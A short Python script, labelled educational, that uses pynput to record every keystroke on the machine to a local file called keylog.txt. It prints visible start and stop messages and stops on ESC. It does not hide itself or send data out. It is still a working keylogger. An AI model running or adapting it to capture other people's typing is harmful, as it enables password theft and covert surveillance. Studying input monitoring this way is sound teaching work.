"""
Educational Keylogger - For Learning Purposes Only
Demonstrates keyboard event monitoring using pynput library
"""

from pynput import keyboard

# Output file for logged keystrokes
log_file = "keylog.txt"

print("🟢 Keylogger started... (Press ESC to stop)\n")


def key_to_str(key):
    """
    Convert keyboard key object to a readable string representation.
    
    Args:
        key: pynput keyboard key object
        
    Returns:
        str: String representation of the key
    """
    try:
        # Regular character keys
        return key.char
    except AttributeError:
        # Special keys mapping
        special_keys = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "\n[ENTER]\n",
            keyboard.Key.tab: "[TAB]",
            keyboard.Key.backspace: "[BACKSPACE]",
            keyboard.Key.shift: "[SHIFT]",
            keyboard.Key.ctrl_l: "[CTRL]",
            keyboard.Key.ctrl_r: "[CTRL]",
            keyboard.Key.alt_l: "[ALT]",
            keyboard.Key.alt_r: "[ALT]",
            keyboard.Key.cmd: "[CMD]",
            keyboard.Key.esc: "[ESC]",
        }
        return special_keys.get(key, f"[{key}]")


def on_press(key):
    """
    Callback function triggered when a key is pressed.
    
    Args:
        key: pynput keyboard key object
        
    Returns:
        bool or None: False to stop the listener, None to continue
    """
    key_str = key_to_str(key)
    
    # Write captured key to log file
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(key_str)
    
    # Stop listener if ESC is pressed
    if key == keyboard.Key.esc:
        print("\n🔴 Keylogger stopped.")
        return False


def main():
    """Main function to start the keyboard listener."""
    try:
        # Create and start the keyboard listener
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except PermissionError:
        print("❌ Error: This script requires elevated permissions.")
        print("   Try running with: sudo python keylogger.py (on macOS/Linux)")
    except Exception as e:
        print(f"❌ Error: {e}")


if __name__ == "__main__":
    main()
